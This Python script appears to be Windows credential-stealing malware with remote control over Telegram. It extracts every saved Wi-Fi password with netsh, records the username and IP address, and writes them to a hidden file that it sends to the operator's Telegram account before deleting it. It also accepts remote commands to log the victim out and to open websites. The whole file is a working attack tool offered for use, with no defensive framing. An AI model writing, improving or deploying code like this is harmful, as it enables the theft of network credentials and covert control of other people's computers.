import sys
import os
import subprocess
import telebot


bot = telebot.TeleBot("TELGRAM_BOT_TOKEN") # Replace with your actual bot token

try:
	bot.send_message("YOUR_TELEGRAM_ID", "Connection found.") # Replace with your telegram id
except:
	pass


def stored_wifi():
	output = subprocess.check_output('netsh wlan show profiles', shell=True).decode(sys.stdout.encoding)

	output = output.split("\n")

	profiles = []
	wifi_list = []

	for line in range(9, len(output)):
		if output[line].strip() != "":	
			profiles.append(output[line].split(":")[1].strip())
		continue

	for SSID in profiles:
		output_line = subprocess.check_output('netsh wlan show profile "{}" key=clear'.format(SSID), shell=True).decode(sys.stdout.encoding).split("\n")

		for each in output_line:

			if each.split(":")[0].strip() == "Key Content":
				password = each.split(":")[1].strip()

				wifi_list.append([SSID, password])
	
	return wifi_list


def currently_connected_to(db):
	interface = subprocess.check_output('netsh wlan show interfaces', shell=True).decode(sys.stdout.encoding)
	interface = interface.split("\n")
	private_ip = subprocess.check_output('ipconfig', shell=True).decode(sys.stdout.encoding).split("\n")

	for line in interface:
		if line.split(":")[0].strip() == "SSID":
			print("\nCurrently connected: " + line.split(":")[1].strip() + "\n", file=db)

	for each in private_ip:
		if "IPv4" in each:
			private_ip = each.split(":")[1].strip()
			print("Private IP address: " + private_ip + "\n", file=db)

	for line in interface:
		print(line.strip(), file=db)

def send_info():
	try:
		with open("Wifi_info.txt", "w") as db:
			subprocess.call("attrib +H Wifi_info.txt")
			username = subprocess.check_output('whoami', shell=True).decode(sys.stdout.encoding).strip()
			print(username + "\n", file=db)
			for [SSID, password] in stored_wifi():
				print("SSID: " + SSID + (" " * (25 - len(SSID))) + "Password: " + password, file=db)
			currently_connected_to(db)

		with open("Wifi_info.txt", "rb") as data:
			bot.send_document("YOUR_TELEGRAM_ID", data) # Replace with your telegram id
	except:
		pass

	finally:
		os.remove("Wifi_info.txt")


def logout():
	subprocess.call("shutdown /l", shell=True)


def websearch(website):
	subprocess.call("start chrome -incognito -new-window {}".format(website), shell=True)


@bot.message_handler(commands=['grab_wifi'])
def handle_command(message):
    bot.reply_to(message, "Sending file...")
    send_info()


@bot.message_handler(commands=['logout'])
def handle_command(message):
    logout()


@bot.message_handler(commands=['status'])
def handle_command(message):
    bot.reply_to(message, "Connected.")


@bot.message_handler(func=lambda message: True)
def handle_all_message(message):
    if message.from_user.id == YOUR_TELEGRAM_ID:  # Replace with your telegram id
    	if message.text.lower()[:5] == "goto ":
    		site = message.text.split(" ", 1)[1].strip()
    		websearch(site)

send_info()


bot.polling()
